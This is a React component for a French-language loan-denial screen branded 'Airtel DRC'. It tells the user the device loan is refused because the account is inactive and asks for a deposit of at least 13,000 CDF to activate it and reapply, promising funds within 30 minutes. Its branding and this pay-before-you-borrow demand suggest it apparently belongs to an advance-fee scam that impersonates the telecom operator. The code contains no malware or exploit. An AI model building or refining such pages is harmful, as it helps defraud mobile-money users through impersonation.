import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelDenied() {
  const navigate = useNavigate();
  const [device, setDevice] = useState<any>(null);

  // Load the selected device from localStorage on mount
  useEffect(() => {
    const savedDevice = localStorage.getItem('selectedDevice');
    if (savedDevice) {
      try {
        setDevice(JSON.parse(savedDevice));
      } catch (e) {
        console.error("Failed to parse device", e);
      }
    }
  }, []);

  const handleClearAndNavigate = () => {
    // Clear all session data
    localStorage.removeItem('airtelPhone');
    localStorage.removeItem('loanLimit');
    localStorage.removeItem('selectedDevice');
    navigate('/'); // Go back to landing page
  };

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger" onClick={handleClearAndNavigate} role="button" aria-label="Retour">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12" />
            <polyline points="12 19 5 12 12 5" />
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel DRC</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        {/* Denied Icon */}
        <div className="airtel-denied-icon">
          <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" y1="8" x2="12" y2="12"></line>
            <line x1="12" y1="16" x2="12.01" y2="16"></line>
          </svg>
        </div>

        <h2 className="airtel-denied-heading">Prêt refusé !</h2>
        
        {/* Dynamic Text based on the selected device */}
        <p className="airtel-denied-subtext">
          Votre demande de prêt {device ? `pour le ${device.name}` : ''} a été refusée.
        </p>

        {/* Inactive Account Box */}
        <div className="airtel-inactive-box">
          <div className="airtel-inactive-title">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="5" width="20" height="14" rx="2"></rect>
              <line x1="2" y1="10" x2="22" y2="10"></line>
            </svg>
            <span>Airtel inactif</span>
          </div>
          <p className="airtel-inactive-text">Veuillez déposer au moins</p>
          <p className="airtel-inactive-amount">
            {/* You can also make this amount dynamic based on device.downPayment if needed */}
            13 000 CDF
          </p>
          <p className="airtel-inactive-text">
            sur votre compte Airtel pour l'activer et faire une nouvelle demande.
          </p>
        </div>

        {/* Checklist Box */}
        <div className="airtel-checklist-box">
          <div className="airtel-checklist-item">
            <span className="checkmark">✓</span> Les fonds pour votre {device ? device.name : 'article'} seront transférés sur votre compte dans un délai de 30 minutes.
          </div>
          <div className="airtel-checklist-item">
            <span className="checkmark">✓</span> Période de remboursement du prêt : {device ? device.months : '12'} mois
          </div>
        </div>

        {/* Dashboard Button */}
        <button className="airtel-dashboard-btn" onClick={handleClearAndNavigate}>
          Aller au tableau de bord
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="5" y1="12" x2="19" y2="12"></line>
            <polyline points="12 5 19 12 12 19"></polyline>
          </svg>
        </button>

        {/* Back to Login Link */}
        <button className="airtel-back-to-login" onClick={handleClearAndNavigate}>
          Retour à l'accueil
        </button>
      </div>
    </div>
  );
}

export default AirtelDenied;